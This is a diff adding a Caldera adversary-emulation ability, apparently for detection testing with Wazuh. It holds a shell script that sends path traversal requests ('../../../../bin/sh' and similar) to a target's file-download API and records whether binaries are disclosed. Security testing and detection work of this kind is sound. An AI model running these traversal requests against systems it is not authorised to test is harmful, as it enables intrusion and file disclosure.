@@ -1,0 +1,44 @@
+- id: d5f9a3c2-0e6b-4a8f-b4d7-9b3e2f0a1d5c
+  name: Path Traversal - Binary File Access (Tier 2)
+  description: >-
+    Path traversal binary file access. 공격자 측에서 응답 메타데이터(code/size)만 보고 verdict(pt.verdict)와
+    근거(pt.evidence.kind)를 fact 로 산출한다 (결정1). 200 + 본문>0 이면 SUCCEEDED/FILE_DISCLOSED,
+    404 는 FAILED, 5xx 는 EXECUTED. 바이너리 본문은 저장하지 않는다. 매핑 T1190. 탐지 대상 Wazuh rule 100220.
+    주의: Caldera 는 명령 개행을 제거하므로 각 구문은 ';' 로 종료한다.
+  tactic: initial-access
+  technique:
+    attack_id: T1190
+    name: Exploit Public-Facing Application
+  platforms:
+    linux:
+      sh:
+        command: |-
+          OP_ID="#{paw}";
+          TECH_ID="T1190";
+          ABILITY_ID="d5f9a3c2-0e6b-4a8f-b4d7-9b3e2f0a1d5c";
+          TARGET="http://#{target.url}";
+          H1="X-Caldera-Op-Id: ${OP_ID}";
+          H2="X-Caldera-Technique: ${TECH_ID}";
+          H3="X-Caldera-Ability: ${ABILITY_ID}";
+          UA="Caldera/${OP_ID}/${TECH_ID}/${ABILITY_ID}";
+          meta(){ curl -s -m 8 -o /dev/null -w "%{http_code} %{size_download}" -H "$H1" -H "$H2" -H "$H3" -A "$UA" "${TARGET}/api/files/download?filename=$1"; };
+          M=$(meta "../../../../bin/sh");
+          CODE=${M%% *}; SIZE=${M##* };
+          meta "../../../../bin/bash" >/dev/null 2>&1;
+          meta "../../../../usr/bin/env" >/dev/null 2>&1;
+          V=FAILED; K=none;
+          if [ "$CODE" = "200" ] && [ "${SIZE:-0}" -gt 0 ] 2>/dev/null; then V=SUCCEEDED; K=FILE_DISCLOSED;
+          elif [ "$CODE" = "404" ]; then V=FAILED; K=none;
+          elif [ "$CODE" = "500" ] || [ "$CODE" = "502" ]; then V=EXECUTED; K=none;
+          else V=FAILED; K=none; fi;
+          printf '{"verdict":"%s","evidence_kind":"%s"}\n' "$V" "$K";
+        parsers:
+          plugins.stockpile.app.parsers.json:
+          - source: pt.verdict
+            custom_parser_vals:
+              json_key: verdict
+              json_type: str
+          - source: pt.evidence.kind
+            custom_parser_vals:
+              json_key: evidence_kind
+              json_type: str
